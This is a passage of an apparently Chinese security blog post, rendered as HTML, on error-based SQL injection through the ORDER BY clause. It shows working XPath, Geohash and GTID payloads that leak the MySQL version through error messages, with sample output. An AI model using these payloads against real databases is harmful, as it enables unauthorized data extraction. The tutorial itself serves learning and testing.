+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165152148.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165152148.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165152148.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165152148.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 254;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="4报错注入" class="heading-element"><span>4、报错注入</span>
+  <a href="#4%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>如果列名可控，即为 <code>?orderby=id</code>的情况：</p>
+<h4 id="1xpath报错" class="heading-element"><span>1）XPath报错</span>
+  <a href="#1xpath%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">/</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1105</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~8.0.31&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">/</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1105</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~8.0.31~&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2geohash报错" class="heading-element"><span>2）Geohash报错</span>
+  <a href="#2geohash%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">26</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w">  </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">ST_LongFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1411</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">geohash</span><span class="w"> </span><span class="n">value</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">ST_LONGFROMGEOHASH</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">ST_PointFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">()),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1210</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">arguments</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">ST_LatFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1411</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">geohash</span><span class="w"> </span><span class="n">value</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">ST_LATFROMGEOHASH</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165245962.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165245962.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165245962.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165245962.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 226;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">31</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">ST_LongFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1411</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">geohash</span><span class="w"> </span><span class="n">value</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;8.0.31&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">ST_LONGFROMGEOHASH</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">ST_PointFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">()),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1210</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">arguments</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">ST_LatFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1411</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">geohash</span><span class="w"> </span><span class="n">value</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;8.0.31&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">ST_LATFROMGEOHASH</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165259586.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165259586.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165259586.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165259586.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 222;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h4 id="3gtid报错" class="heading-element"><span>3）GTID报错</span>
+  <a href="#3gtid%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">26</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">gtid_subtract</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1772</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Malformed</span><span class="w"> </span><span class="n">GTID</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">specification</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">gtid_subset</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1772</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Malformed</span><span class="w"> </span><span class="n">GTID</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">specification</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165418105.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165418105.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165418105.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165418105.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 140;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">31</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">gtid_subtract</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1772</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Malformed</span><span class="w"> </span><span class="n">GTID</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">specification</span><span class="w"> </span><span class="s1">&#39;8.0.31&#39;</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="o">/</span><span class="p">(</span><span class="n">gtid_subset</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1772</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Malformed</span><span class="w"> </span><span class="n">GTID</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">specification</span><span class="w"> </span><span class="s1">&#39;8.0.31&#39;</span><span class="p">.</span></span></span></code></pre></td></tr></table>
+</div>
